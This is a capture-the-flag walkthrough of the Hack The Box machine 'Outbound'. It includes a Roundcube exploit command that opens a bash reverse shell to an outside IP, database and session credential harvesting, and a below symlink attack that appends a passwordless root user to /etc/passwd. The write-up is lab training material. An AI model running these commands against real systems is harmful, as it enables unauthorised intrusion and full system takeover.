# Outbound.htb

# Enmuration

## Nmap

```jsx
nmap -T5 -sC -sV -Pn 10.10.11.77
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-28 03:52 CET
Warning: 10.10.11.77 giving up on port because retransmission cap hit (2).
Nmap scan report for mail.outbound.htb (10.10.11.77)
Host is up (0.26s latency).
Not shown: 535 closed tcp ports (conn-refused), 463 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: Roundcube Webmail :: Welcome to Roundcube Webmail
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Web

![Screenshot from 2025-11-28 03-58-22.png](Outbound%20htb/Screenshot_from_2025-11-28_03-58-22.png)

```jsx
Credentials given from hack the box:
tyler:LhKL1o9Nm3X2
```

[https://github.com/hakaioffsec/CVE-2025-49113-exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit)

### Looking online for Roundcube Webmail vulns:

### Reverse shell:

```jsx
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.66/9999 0>&1'"
```

## Upgarge shell:

```jsx
script -qc /bin/bash /dev/null
```

### ✔ Breakdown:

- `script` → starts a TTY
- `q` → quiet (no banner)
- `c /bin/bash` → run bash inside the TTY
- `/dev/null` → don’t save a log file

```jsx
Ctrl + Z
stty raw -echo
fg
export TERM=xterm
stty rows 40 cols 120
if not working okay: reset
```

# **`export TERM=xterm`**

## **What does it mean?**

`TERM` is an environment variable that tells Linux **what kind of terminal you are using**.

When you use a reverse shell, the system usually doesn’t know what terminal you have

### ✔ Why "xterm"?

Because **xterm** is a very common and safe terminal type.

`stty` = **set terminal options**

Reverse shells don’t know:

- how many rows your screen has (lines)
- how many columns your screen has (characters per line)

So many programs break because they think your screen is tiny or weird.

### Found mysql user:

```jsx
www-data@mail:/var/www/html/roundcube/config$ cat config.inc.php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

### Then found another web user:

```jsx
MariaDB [roundcube]> select * from session
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |

jacob:595mO8DmwGeD
```

### Than we find the ssh password in the web mail:

```jsx
jacob:gY4Wr3a1evp4
```

# Privesc:

```jsx
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*

```

```jsx
jacob@outbound:~$ below help
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help

```

# 🗂️ **What is `/opt`?**

`/opt` stands for **optional**.

It is a directory used to store:

### ✔️ Third-party applications

### ✔️ Programs that are *not* part of the main Linux system

### ✔️ Software you manually install

Think of `/opt` as a folder where **extra apps live**, separate from the core system.

```jsx
jacob@outbound:/opt/below$ ls 
below       Cargo.toml   CODE_OF_CONDUCT.md  CONTRIBUTING.md  Dockerfile.debian  etc  LICENSE    rustfmt.toml  target
Cargo.lock  clippy.toml  contrib             Dockerfile       docs               img  README.md  scripts

```

# 🦀 What is Cargo?

Cargo is the **package manager and build tool** for the Rust programming language.

```jsx
Example of cargo.toml file
[package]
name = "my_first_program"
version = "0.1.0"
edition = "2021"

[dependencies]
rand = "0.8"

```

### Looking for the version of below:

```jsx
jacob@outbound:/opt/below$ cat Cargo.toml 
[workspace]
members = [
  "below/",
  "below/below_derive",
  "below/btrfs",
  "below/cgroupfs",
  "below/common",
  "below/config",
  "below/dump",
  "below/ethtool",
  "below/gpu_stats",
  "below/model",
  "below/procfs",
  "below/render",
  "below/resctrlfs",
  "below/store",
  "below/view",
]
resolver = "2"

jacob@outbound:/opt/below$ find .  -name Cargo.toml
./below/render/Cargo.toml
./below/resctrlfs/Cargo.toml
./below/dump/Cargo.toml
./below/below_derive/Cargo.toml
./below/store/Cargo.toml
./below/common/Cargo.toml
./below/btrfs/Cargo.toml
./below/ethtool/Cargo.toml
./below/cgroupfs/Cargo.toml
./below/view/Cargo.toml
./below/procfs/Cargo.toml
./below/Cargo.toml
./below/config/Cargo.toml
./below/gpu_stats/Cargo.toml
./below/model/Cargo.toml
./Cargo.toml
```

```jsx
jacob@outbound:/opt/below$ cat ./below/config/Cargo.toml
# @generated by autocargo from //resctl/below/config:below-config

[package]
name = "below-config"
**version = "0.8.0"**
authors = ["Daniel Xu <dlxu@fb.com>", "Facebook"]
edition = "2021"
description = "Configurations for below"
repository = "https://github.com/facebookincubator/below"
license = "Apache-2.0"

[dependencies]
anyhow = "1.0.75"
btrfs = { package = "below-btrfs", version = "0.8.0", path = "../btrfs" }
cgroupfs = { version = "0.8.0", path = "../cgroupfs" }
serde = { version = "1.0.185", features = ["derive", "rc"] }
toml = "0.8.4"

[dev-dependencies]
tempfile = "3.8"

```

### Serching for below 0.8.0 exploits:

[https://github.com/rvizx/CVE-2025-27591](https://github.com/rvizx/CVE-2025-27591)

**Introduction**

`Below` versions <= 0.8.1 contains a critical local privilege escalation vulnerability (CVE-2025-27591).

Due to a misconfigured world-writable log directory (`/var/log/below/`) and insecure permission logic in the Rust codebase, a local attacker can symlink `error_<user>.log` to any root-owned file like `/etc/passwd`.

When `below snapshot` is executed with `sudo`, it forcibly sets mode `0666` on the log file and writes to it—even if it's a symlink.

This allows injection of a `root`-privileged user without password, leading to full root shell access.

```jsx
jacob@outbound:/var/log/below$ rm error_root.log 
jacob@outbound:/var/log/below$ ln -s /etc/passwd error_root.log
jacob@outbound:/var/log/below$ ls -la
total 12
drwxrwxrwx  3 root  root   4096 Nov 29 03:26 .
drwxrwxr-x 13 root  syslog 4096 Nov 28 10:01 ..
lrwxrwxrwx  1 jacob jacob    11 Nov 29 03:26 error_root.log -> /etc/passwd
drwxr-xr-x  2 root  root   4096 Nov 29 00:00 store
jacob@outbound:/var/log/below$ echo 'pwn::0:0:root:/root:/bin/bash' >> /etc/passwd

jacob@outbound:/var/log/below$ sudo below
jacob@outbound:/var/log/below$ echo 'pwn::0:0:root:/root:/bin/bash' >> /etc/passwd
jacob@outbound:/var/log/below$ su pwn
root@outbound:/var/log/below# ls

```